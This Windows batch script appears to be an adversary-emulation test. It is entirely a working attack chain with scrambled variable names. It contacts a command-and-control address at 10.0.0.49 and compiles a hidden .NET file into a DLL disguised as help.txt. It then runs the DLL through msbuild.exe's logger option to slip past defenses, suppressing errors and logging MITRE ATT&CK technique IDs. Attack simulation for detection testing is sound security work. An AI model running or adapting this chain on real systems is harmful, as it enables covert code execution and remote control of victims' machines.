@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\8233\aef18f90
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8233-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=help.txt
SET njozco=file.txt
SET kkjwr=8233

REM Derived paths
SET zxddff=%APPDATA%\!ufeybybm!\macula-simulations.log
SET qwmnb=csc.exe
SET vbncwx=%APPDATA%\!ufeybybm!
SET rtyuio=msbuild.exe

REM 1. C2 HEARTBEAT (must be the first task before anything else)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_start=!uouoq!>> "!zxddff!" 2>nul
curl -k -s -o nul "!uouoq!"
SET cvsdf=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_complete=exitcode_!cvsdf!>> "!zxddff!" 2>nul

REM 2. Change to output directory
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_start=!recnn!>> "!zxddff!" 2>nul
cd /d "!recnn!" >nul 2>nul
SET xcvbng=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_complete=exitcode_!xcvbng!>> "!zxddff!" 2>nul

REM 3. Compile .NET source to DLL (T1500: Compile After Delivery)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_start=source_!njozco!_target_!hpnjatpj!>> "!zxddff!" 2>nul
SET ttp_result_1=1
SET ttp_error_1=
!qwmnb! /target:library /reference:Microsoft.Build.Framework.dll /out:"!hpnjatpj!" "!njozco!" >nul 2>nul
IF !ERRORLEVEL! NEQ 0 (
    SET ttp_result_1=0
    SET ttp_error_1=compile_failed_!ERRORLEVEL!
)
SET fghjkl=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_complete=exitcode_!fghjkl!>> "!zxddff!" 2>nul

REM TTP logging for T1500
SET timestamp_1=!DATE:~-4!-!DATE:~4,2!-!DATE:~7,2! !TIME!
SET ttp_log_1=[!timestamp_1!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!ttp_result_1!:!ttp_error_1!
echo !ttp_log_1!>> "!zxddff!" 2>nul || >nul

REM 4. Execute compiled DLL via MSBuild (T1218: Signed Binary Proxy Execution)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: msbuild_start=logger_!hpnjatpj!>> "!zxddff!" 2>nul
SET ttp_result_2=1
SET ttp_error_2=
!rtyuio! /logger:LoggerEntry,"!recnn!\\!hpnjatpj!";MyParameters,Foo >nul 2>nul
IF !ERRORLEVEL! NEQ 0 (
    SET ttp_result_2=0
    SET ttp_error_2=exec_failed_!ERRORLEVEL!
)
SET hjklzx=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: msbuild_complete=exitcode_!hjklzx!>> "!zxddff!" 2>nul

REM TTP logging for T1218
SET timestamp_2=!DATE:~-4!-!DATE:~4,2!-!DATE:~7,2! !TIME!
SET ttp_log_2=[!timestamp_2!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!ttp_result_2!:!ttp_error_2!
echo !ttp_log_2!>> "!zxddff!" 2>nul || >nul

ENDLOCAL